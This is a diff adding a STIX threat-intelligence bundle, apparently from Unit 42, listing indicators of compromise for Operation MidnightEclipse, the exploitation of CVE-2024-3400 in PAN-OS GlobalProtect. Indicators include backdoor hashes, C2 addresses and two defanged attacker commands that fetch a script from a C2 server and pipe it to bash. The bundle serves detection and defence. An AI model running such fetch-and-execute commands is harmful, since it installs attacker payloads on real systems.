@@ -1,0 +1,454 @@
+{
+  "type": "bundle",
+  "id": "bundle--22798be0-3067-45ca-8378-0edb60aad0a5",
+  "spec_version": "2.0",
+  "objects": [
+    {
+      "type": "report",
+      "id": "report--d5475dc5-8fc5-4e05-8749-18c4150534ed",
+      "created": "2024-04-25T18:50:00.001Z",
+      "modified": "2024-04-25T18:50:00.001Z",
+      "name": "2024-04-12-MidnightEclipse.json",
+      "title": "Threat Brief: Operation MidnightEclipse, Post-Exploitation Activity Related to CVE-2024-3400",
+      "description": "Activity related initial exploitation of CVE-2024-3400 vulnerability tracked under the name Operation MidnightEclipse",
+      "published": "2024-04-12T10:00:00.001Z",
+      "external_references": [
+        {
+          "source_name": "Palo Alto Networks Unit 42 Threat Research Blog",
+          "url": "https://unit42.paloaltonetworks.com/cve-2024-3400/",
+          "description": "Article from Palo Alto Networks Unit 42 Threat Research Blog about exploitation of CVE-2024-3400 vulnerabilitytracked under the name Operation MidnightEclipse"
+        },
+        {
+          "source_name": "Palo Alto Networks Security advisory on CVE-2024-3400",
+          "url": "https://security.paloaltonetworks.com/CVE-2024-3400",
+          "description": "CVE-2024-3400 PAN-OS: Arbitrary File Creation Leads to OS Command Injection Vulnerability in GlobalProtect"
+        }
+      ],
+      "object_refs": [
+        "indicator--047e4282-068a-4d03-a421-f94142f9c58c",
+        "indicator--ac8401fe-1659-4670-bbc1-a5944a933e95",
+        "indicator--1ecb2028-78d3-4baf-ab94-3db474995cc2",
+        "indicator--464f6c0c-b51f-45a2-928b-0ad6dd239f59",
+        "indicator--3173d1ed-2127-47fb-8bfb-127f6dc802b0",
+        "indicator--e19f822b-f72d-4259-a20f-322a7cf5853e",
+        "indicator--6a3bece4-6071-4622-a17f-2162eb49163c",
+        "indicator--5ffc3f17-5d86-4c1d-a42f-423e84cc6e32",
+        "indicator--d9d7a4db-b1f4-474e-8554-955f3e88fd22",
+        "indicator--bc314a25-0c9d-4b5d-aa6e-b8c389d737dc",
+        "indicator--bd818536-96e5-492b-ba2d-2f4e90737180",
+        "indicator--a2f7421d-846a-4088-8b03-b5cc4c96c6df",
+        "indicator--7c21d8f4-5896-4b2b-818a-d8a2652ceccb",
+        "indicator--847f1dd7-f0a1-4987-9433-4e88ea33af41",
+        "indicator--0de41db0-9c81-4169-a78a-ad6ebfe4134e",
+        "indicator--98922877-436d-4b71-ad93-b35c3d46ec3d",
+        "indicator--431ad5e7-3638-45a1-80d6-1ff23e0c0395",
+        "indicator--04cf7855-77ae-413a-aaad-7896daf2e56f",
+        "indicator--f433d7d9-9806-489b-b911-de4ce2448f9f",
+        "indicator--0be78ef2-7328-4664-a7f0-a4d9384747ba",
+        "indicator--30b5fc02-787f-4632-8577-1d2a3aed0bfc",
+        "indicator--981972a9-833f-4c5f-a9a7-94a457bb4be2",
+        "indicator--48884e5e-f5b3-4982-8deb-9b3c2b7cfe47",
+        "indicator--9a0b6239-2a69-47b0-8550-ab07bc65dc4a",
+        "indicator--3c0b7eb1-671d-476a-a0a0-6ae55c7ce4e1",
+        "indicator--b3c4bc09-371a-490e-9dad-2e1ac2327042",
+        "indicator--06566896-07ff-46f3-b92a-6e6723f68131",
+        "indicator--1149997a-c8af-4ef4-9d8d-8adc4a70e438",
+        "indicator--bfb6b429-7d96-4482-b828-72e3d376acb6",
+        "indicator--fe0bcf06-b3aa-40b3-a5a0-84bf7e09c593"
+      ],
+      "labels": [
+        "unit-42-threat-brief"
+      ]
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--047e4282-068a-4d03-a421-f94142f9c58c",
+      "created": "2024-04-25T18:50:00.001Z",
+      "labels": [
+        "malicious-activity"
+      ],
+      "modified": "2024-04-25T18:50:00.001Z",
+      "name": "update.py",
+      "pattern": "[file:hashes.'SHA-256' = '3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac']",
+      "description": "Python script for UPSTYLE backdoor payload used for explotation attempts of CVE-2024-3400 seen as early as 2024-04-12.",
+      "valid_from": "2024-04-12T00:00:00.001Z"
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--ac8401fe-1659-4670-bbc1-a5944a933e95",
+      "created": "2024-04-25T18:50:00.001Z",
+      "labels": [
+        "malicious-activity"
+      ],
+      "modified": "2024-04-25T18:50:00.001Z",
+      "name": "unknown (python script for UPSTYLE backdoor)",
+      "pattern": "[file:hashes.'SHA-256' = '5460b51da26c060727d128f3b3d6415d1a4c25af6a29fef4cc6b867ad3659078']",
+      "description": "Python script for UPSTYLE backdoor payload used for explotation attempts of CVE-2024-3400 seen as early as 2024-04-12.",
+      "valid_from": "2024-04-12T00:00:00.001Z"
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--1ecb2028-78d3-4baf-ab94-3db474995cc2",
+      "created": "2024-04-25T18:50:00.001Z",
+      "labels": [
+        "malicious-activity"
+      ],
+      "modified": "2024-04-25T18:50:00.001Z",
+      "name": "http://172.233.228.93/policy",
+      "pattern": "[url:value = 'http://172.233.228.93/policy']",
+      "description": "URL from command and control (C2) infrastructure seen during explotation attempts of CVE-2024-3400 as early as 2024-04-12.",
+      "valid_from": "2024-04-12T00:00:00.001Z"
+    },
+     {
+      "type": "indicator",
+      "id": "indicator--464f6c0c-b51f-45a2-928b-0ad6dd239f59",
+      "created": "2024-04-25T18:50:00.001Z",
+      "labels": [
+        "malicious-activity"
+      ],
+      "modified": "2024-04-25T18:50:00.001Z",
+      "name": "http://172.233.228.93/patch",
+      "pattern": "[url:value = 'http://172.233.228.93/patch']",
+      "description": "URL from command and control (C2) infrastructure seen during explotation attempts of CVE-2024-3400 as early as 2024-04-12.",
+      "valid_from": "2024-04-12T00:00:00.001Z"
+    },
+   {
+      "type": "indicator",
+      "id": "indicator--3173d1ed-2127-47fb-8bfb-127f6dc802b0",
+      "created": "2024-04-25T18:50:00.001Z",
+      "labels": [
+        "malicious-activity"
+      ],
+      "modified": "2024-04-25T18:50:00.001Z",
+      "name": "nhdata.s3-us-west-2.amazonaws.com",
+      "pattern": "[domain-name:value = 'nhdata.s3-us-west-2.amazonaws.com']",
+      "description": "Domain hosting UPSTYLE Python backdoor seen during explotation attempts of CVE-2024-3400 as early as 2024-04-12.",
+      "valid_from": "2024-04-12T00:00:00.001Z"
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--e19f822b-f72d-4259-a20f-322a7cf5853e",
+      "created": "2024-04-25T18:50:00.001Z",
+      "labels": [
+        "malicious-activity"
+      ],
+      "modified": "2024-04-25T18:50:00.001Z",
+      "name": "172.233.228.93",
+      "pattern": "[ipv4-addr:value = '172.233.228.93']",
+      "description": "IP address hosting command and control (C2) infrastructure seen during explotation attempts of CVE-2024-3400 as early as 2024-04-12.",
+      "valid_from": "2024-04-12T00:00:00.001Z"
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--6a3bece4-6071-4622-a17f-2162eb49163c",
+      "created": "2024-04-25T18:50:00.001Z",
+      "labels": [
+        "malicious-activity"
+      ],
+      "modified": "2024-04-25T18:50:00.001Z",
+      "name": "66.235.168.222",
+      "pattern": "[ipv4-addr:value = '66.235.168.222']",
+      "description": "IP address hosting command and control (C2) infrastructure seen during explotation attempts of CVE-2024-3400 as early as 2024-04-12.",
+      "valid_from": "2024-04-12T00:00:00.001Z"
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--5ffc3f17-5d86-4c1d-a42f-423e84cc6e32",
+      "created": "2024-04-25T18:50:00.001Z",
+      "labels": [
+        "malicious-activity"
+      ],
+      "modified": "2024-04-25T18:50:00.001Z",
+      "name": "144.172.79.92",
+      "pattern": "[ipv4-addr:value = '144.172.79.92]",
+      "description": "IP address hosting UPSTYLE Python backdoor seen during explotation attempts of CVE-2024-3400 as early as 2024-04-12.",
+      "valid_from": "2024-04-12T00:00:00.001Z"
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--d9d7a4db-b1f4-474e-8554-955f3e88fd22",
+      "created": "2024-04-25T18:50:00.001Z",
+      "labels": [
+        "malicious-activity"
+      ],
+      "modified": "2024-04-25T18:50:00.001Z",
+      "name": "wget -qO- hxxp://172.233.228[.]93/patch|bash",
+      "pattern": "[process:command_line  = 'wget -qO- hxxp://172.233.228[.]93/patch|bash']",
+      "description": "Command seen during explotation attempts of CVE-2024-3400 as early as 2024-04-12.",
+      "valid_from": "2024-04-12T00:00:00.001Z"
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--bc314a25-0c9d-4b5d-aa6e-b8c389d737dc",
+      "created": "2024-04-25T18:50:00.001Z",
+      "labels": [
+        "malicious-activity"
+      ],
+      "modified": "2024-04-25T18:50:00.001Z",
+      "name": "wget -qO- hxxp://172.233.228[.]93/policy | bash",
+      "pattern": "[process:command_line  = 'wget -qO- hxxp://172.233.228[.]93/policy | bash']",
+      "description": "Command seen during explotation attempts of CVE-2024-3400 as early as 2024-04-12.",
+      "valid_from": "2024-04-12T00:00:00.001Z"
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--a2f7421d-846a-4088-8b03-b5cc4c96c6df",
+      "created": "2024-04-25T18:50:00.001Z",
+      "labels": [
+        "malicious-activity"
+      ],
+      "modified": "2024-04-25T18:50:00.001Z",
+      "name": "110.47.250.103",
+      "pattern": "[ipv4-addr:value = '110.47.250.103']",
+      "description": "IP addresss that has triggered Palo Alto Networks Threat Prevention Sigunature with Threat ID 951867 associated with explotation attempts of CVE-2024-3400 since 2024-04-12.",
+      "valid_from": "2024-04-24T00:00:00.001Z"
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--a2f7421d-846a-4088-8b03-b5cc4c96c6df",
+      "created": "2024-04-25T18:50:00.001Z",
+      "labels": [
+        "malicious-activity"
+      ],
+      "modified": "2024-04-25T18:50:00.001Z",
+      "name": "126.227.76.24",
+      "pattern": "[ipv4-addr:value = '126.227.76.24']",
+      "description": "IP addresss that has triggered Palo Alto Networks Threat Prevention Sigunature with Threat ID 951867 associated with explotation attempts of CVE-2024-3400 since 2024-04-12.",
+      "valid_from": "2024-04-24T00:00:00.001Z"
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--7c21d8f4-5896-4b2b-818a-d8a2652ceccb",
+      "created": "2024-04-25T18:50:00.001Z",
+      "labels": [
+        "malicious-activity"
+      ],
+      "modified": "2024-04-25T18:50:00.001Z",
+      "name": "38.207.148.123",
+      "pattern": "[ipv4-addr:value = '38.207.148.123']",
+      "description": "IP addresss that has triggered Palo Alto Networks Threat Prevention Sigunature with Threat ID 951867 associated with explotation attempts of CVE-2024-3400 since 2024-04-12.",
+      "valid_from": "2024-04-24T00:00:00.001Z"
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--847f1dd7-f0a1-4987-9433-4e88ea33af41",
+      "created": "2024-04-25T18:50:00.001Z",
+      "labels": [
+        "malicious-activity"
+      ],
+      "modified": "2024-04-25T18:50:00.001Z",
+      "name": "147.45.70.100",
+      "pattern": "[ipv4-addr:value = '147.45.70.100']",
+      "description": "IP addresss that has triggered Palo Alto Networks Threat Prevention Sigunature with Threat ID 951867 associated with explotation attempts of CVE-2024-3400 since 2024-04-12.",
+      "valid_from": "2024-04-24T00:00:00.001Z"
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--0de41db0-9c81-4169-a78a-ad6ebfe4134e",
+      "created": "2024-04-25T18:50:00.001Z",
+      "labels": [
+        "malicious-activity"
+      ],
+      "modified": "2024-04-25T18:50:00.001Z",
+      "name": "199.119.206.28",
+      "pattern": "[ipv4-addr:value = '199.119.206.28']",
+      "description": "IP addresss that has triggered Palo Alto Networks Threat Prevention Sigunature with Threat ID 951867 associated with explotation attempts of CVE-2024-3400 since 2024-04-12.",
+      "valid_from": "2024-04-24T00:00:00.001Z"
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--98922877-436d-4b71-ad93-b35c3d46ec3d",
+      "created": "2024-04-25T18:50:00.001Z",
+      "labels": [
+        "malicious-activity"
+      ],
+      "modified": "2024-04-25T18:50:00.001Z",
+      "name": "38.181.70.3",
+      "pattern": "[ipv4-addr:value = '38.181.70.3']",
+      "description": "IP addresss that has triggered Palo Alto Networks Threat Prevention Sigunature with Threat ID 951867 associated with explotation attempts of CVE-2024-3400 since 2024-04-12.",
+      "valid_from": "2024-04-24T00:00:00.001Z"
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--431ad5e7-3638-45a1-80d6-1ff23e0c0395",
+      "created": "2024-04-25T18:50:00.001Z",
+      "labels": [
+        "malicious-activity"
+      ],
+      "modified": "2024-04-25T18:50:00.001Z",
+      "name": "149.28.194.95",
+      "pattern": "[ipv4-addr:value = '149.28.194.95']",
+      "description": "IP addresss that has triggered Palo Alto Networks Threat Prevention Sigunature with Threat ID 951867 associated with explotation attempts of CVE-2024-3400 since 2024-04-12.",
+      "valid_from": "2024-04-24T00:00:00.001Z"
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--04cf7855-77ae-413a-aaad-7896daf2e56f",
+      "created": "2024-04-25T18:50:00.001Z",
+      "labels": [
+        "malicious-activity"
+      ],
+      "modified": "2024-04-25T18:50:00.001Z",
+      "name": "78.141.232.174",
+      "pattern": "[ipv4-addr:value = '78.141.232.174']",
+      "description": "IP addresss that has triggered Palo Alto Networks Threat Prevention Sigunature with Threat ID 951867 associated with explotation attempts of CVE-2024-3400 since 2024-04-12.",
+      "valid_from": "2024-04-24T00:00:00.001Z"
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--f433d7d9-9806-489b-b911-de4ce2448f9f",
+      "created": "2024-04-25T18:50:00.001Z",
+      "labels": [
+        "malicious-activity"
+      ],
+      "modified": "2024-04-25T18:50:00.001Z",
+      "name": "38.180.128.159",
+      "pattern": "[ipv4-addr:value = '38.180.128.159']",
+      "description": "IP addresss that has triggered Palo Alto Networks Threat Prevention Sigunature with Threat ID 951867 associated with explotation attempts of CVE-2024-3400 since 2024-04-12.",
+      "valid_from": "2024-04-24T00:00:00.001Z"
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--0be78ef2-7328-4664-a7f0-a4d9384747ba",
+      "created": "2024-04-25T18:50:00.001Z",
+      "labels": [
+        "malicious-activity"
+      ],
+      "modified": "2024-04-25T18:50:00.001Z",
+      "name": "64.176.226.203",
+      "pattern": "[ipv4-addr:value = '64.176.226.203']",
+      "description": "IP addresss that has triggered Palo Alto Networks Threat Prevention Sigunature with Threat ID 951867 associated with explotation attempts of CVE-2024-3400 since 2024-04-12.",
+      "valid_from": "2024-04-24T00:00:00.001Z"
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--30b5fc02-787f-4632-8577-1d2a3aed0bfc",
+      "created": "2024-04-25T18:50:00.001Z",
+      "labels": [
+        "malicious-activity"
+      ],
+      "modified": "2024-04-25T18:50:00.001Z",
+      "name": "38.180.106.167",
+      "pattern": "[ipv4-addr:value = '38.180.106.167']",
+      "description": "IP addresss that has triggered Palo Alto Networks Threat Prevention Sigunature with Threat ID 951867 associated with explotation attempts of CVE-2024-3400 since 2024-04-12.",
+      "valid_from": "2024-04-24T00:00:00.001Z"
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--981972a9-833f-4c5f-a9a7-94a457bb4be2",
+      "created": "2024-04-25T18:50:00.001Z",
+      "labels": [
+        "malicious-activity"
+      ],
+      "modified": "2024-04-25T18:50:00.001Z",
+      "name": "173.255.223.159",
+      "pattern": "[ipv4-addr:value = '173.255.223.159']",
+      "description": "IP addresss that has triggered Palo Alto Networks Threat Prevention Sigunature with Threat ID 951867 associated with explotation attempts of CVE-2024-3400 since 2024-04-12.",
+      "valid_from": "2024-04-24T00:00:00.001Z"
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--48884e5e-f5b3-4982-8deb-9b3c2b7cfe47",
+      "created": "2024-04-25T18:50:00.001Z",
+      "labels": [
+        "malicious-activity"
+      ],
+      "modified": "2024-04-25T18:50:00.001Z",
+      "name": "38.60.218.153",
+      "pattern": "[ipv4-addr:value = '38.60.218.153']",
+      "description": "IP addresss that has triggered Palo Alto Networks Threat Prevention Sigunature with Threat ID 951867 associated with explotation attempts of CVE-2024-3400 since 2024-04-12.",
+      "valid_from": "2024-04-24T00:00:00.001Z"
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--9a0b6239-2a69-47b0-8550-ab07bc65dc4a",
+      "created": "2024-04-25T18:50:00.001Z",
+      "labels": [
+        "malicious-activity"
+      ],
+      "modified": "2024-04-25T18:50:00.001Z",
+      "name": "185.108.105.110",
+      "pattern": "[ipv4-addr:value = '185.108.105.110']",
+      "description": "IP addresss that has triggered Palo Alto Networks Threat Prevention Sigunature with Threat ID 951867 associated with explotation attempts of CVE-2024-3400 since 2024-04-12.",
+      "valid_from": "2024-04-24T00:00:00.001Z"
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--3c0b7eb1-671d-476a-a0a0-6ae55c7ce4e1",
+      "created": "2024-04-25T18:50:00.001Z",
+      "labels": [
+        "malicious-activity"
+      ],
+      "modified": "2024-04-25T18:50:00.001Z",
+      "name": "146.70.192.174",
+      "pattern": "[ipv4-addr:value = '146.70.192.174']",
+      "description": "IP addresss that has triggered Palo Alto Networks Threat Prevention Sigunature with Threat ID 951867 associated with explotation attempts of CVE-2024-3400 since 2024-04-12.",
+      "valid_from": "2024-04-24T00:00:00.001Z"
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--b3c4bc09-371a-490e-9dad-2e1ac2327042",
+      "created": "2024-04-25T18:50:00.001Z",
+      "labels": [
+        "malicious-activity"
+      ],
+      "modified": "2024-04-25T18:50:00.001Z",
+      "name": "149.88.27.212",
+      "pattern": "[ipv4-addr:value = '149.88.27.212']",
+      "description": "IP addresss that has triggered Palo Alto Networks Threat Prevention Sigunature with Threat ID 951867 associated with explotation attempts of CVE-2024-3400 since 2024-04-12.",
+      "valid_from": "2024-04-24T00:00:00.001Z"
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--06566896-07ff-46f3-b92a-6e6723f68131",
+      "created": "2024-04-25T18:50:00.001Z",
+      "labels": [
+        "malicious-activity"
+      ],
+      "modified": "2024-04-25T18:50:00.001Z",
+      "name": "154.223.16.34",
+      "pattern": "[ipv4-addr:value = '154.223.16.34']",
+      "description": "IP addresss that has triggered Palo Alto Networks Threat Prevention Sigunature with Threat ID 951867 associated with explotation attempts of CVE-2024-3400 since 2024-04-12.",
+      "valid_from": "2024-04-24T00:00:00.001Z"
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--1149997a-c8af-4ef4-9d8d-8adc4a70e438",
+      "created": "2024-04-25T18:50:00.001Z",
+      "labels": [
+        "malicious-activity"
+      ],
+      "modified": "2024-04-25T18:50:00.001Z",
+      "name": "38.180.41.251",
+      "pattern": "[ipv4-addr:value = '38.180.41.251']",
+      "description": "IP addresss that has triggered Palo Alto Networks Threat Prevention Sigunature with Threat ID 951867 associated with explotation attempts of CVE-2024-3400 since 2024-04-12.",
+      "valid_from": "2024-04-24T00:00:00.001Z"
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--bfb6b429-7d96-4482-b828-72e3d376acb6",
+      "created": "2024-04-25T18:50:00.001Z",
+      "labels": [
+        "malicious-activity"
+      ],
+      "modified": "2024-04-25T18:50:00.001Z",
+      "name": "203.160.86.91",
+      "pattern": "[ipv4-addr:value = '203.160.86.91']",
+      "description": "IP addresss that has triggered Palo Alto Networks Threat Prevention Sigunature with Threat ID 951867 associated with explotation attempts of CVE-2024-3400 since 2024-04-12.",
+      "valid_from": "2024-04-24T00:00:00.001Z"
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--fe0bcf06-b3aa-40b3-a5a0-84bf7e09c593",
+      "created": "2024-04-25T18:50:00.001Z",
+      "labels": [
+        "malicious-activity"
+      ],
+      "modified": "2024-04-25T18:50:00.001Z",
+      "name": "45.121.51.2",
+      "pattern": "[ipv4-addr:value = '45.121.51.2']",
+      "description": "IP addresss that has triggered Palo Alto Networks Threat Prevention Sigunature with Threat ID 951867 associated with explotation attempts of CVE-2024-3400 since 2024-04-12.",
+      "valid_from": "2024-04-24T00:00:00.001Z"
+    }
+  ]
+}
